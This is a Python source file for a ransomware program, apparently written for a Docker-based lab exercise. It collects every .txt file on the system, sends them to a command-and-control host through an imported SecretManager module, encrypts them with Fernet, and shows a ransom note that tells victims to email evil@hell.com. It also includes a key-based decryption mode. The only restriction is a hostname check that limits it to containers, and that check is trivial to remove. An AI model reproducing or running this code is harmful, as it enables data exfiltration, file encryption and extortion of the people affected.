import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager

import base64


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{}' to unlock your data. 
"""

ERROR_MESSAGE = """
 _  __                                     
| |/ /___ _   _    ___ _ __ _ __ ___  _ __ 
| ' // _ \ | | |  / _ \ '__| '__/ _ \| '__|
| . \  __/ |_| | |  __/ |  | | | (_) | |   
|_|\_\___|\__, |  \___|_|  |_|  \___/|_|   
          |___/ 
"""

END_MESSAGE = """
 _____ _ _             ____                             _           _ 
|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |
|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
                                            |___/|_| 
 _   _                           _   _ _            ____              
| | | | __ ___   _____    __ _  | \ | (_) ___ ___  |  _ \  __ _ _   _ 
| |_| |/ _` \ \ / / _ \  / _` | |  \| | |/ __/ _ \ | | | |/ _` | | | |
|  _  | (_| |\ V /  __/ | (_| | | |\  | | (_|  __/ | |_| | (_| | |_| |
|_| |_|\__,_| \_/ \___|  \__,_| |_| \_|_|\___\___| |____/ \__,_|\__, |
                                                                |___/ 

"""

class Ransomware:

    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    """
        Get all the text files paths
    """
    def get_files(self, filter:str)->list:
        p = Path("/") 
        liste_file = [file for file in p.rglob(filter)]
        liste_file_str = [str(txt) for txt in liste_file]
        return liste_file_str

    """
        Main function for encrypting
    """
    def encrypt(self):

        # Obtain all text files path
        files = self.get_files("*.txt")

        # Create a new instance of SecretManager
        secret_manager = SecretManager()
        secret_manager.setup()
        
        # Leak all the files to the CNC
        secret_manager.leak_files(files)

        # Encrypt all the text files
        # secret_manager.xorfiles(files)
        secret_manager.fernet_crypt(files, True)

        # Display the message and the token
        token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token.hex()))

        secret_manager.pwned()
        
    """
        Main function for decrypting
    """
    def decrypt(self) -> bool:
        # Ask the key to the client
        key = input("Enter the key:")
        

        # Decode the key
        try:
            key = base64.b64decode(key)
        except:
            return False

        # Obtain all text files path
        files = self.get_files("*.txt")

        # Create a new instance of SecretManager
        secret_manager = SecretManager()
        
        # Verification of the key
        if(secret_manager.check_key(key)):
            secret_manager.set_key(key)         # Set the keys if validate
            #secret_manager.xorfiles(files)      # Decrypt de files
            secret_manager.fernet_crypt(files, False)
            print(END_MESSAGE)
            return True
        else:
            return False



if __name__ == "__main__":
    #logging.basicConfig(level=logging.DEBUG)
    
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        while not ransomware.decrypt():
            print(ERROR_MESSAGE, end="\n\n")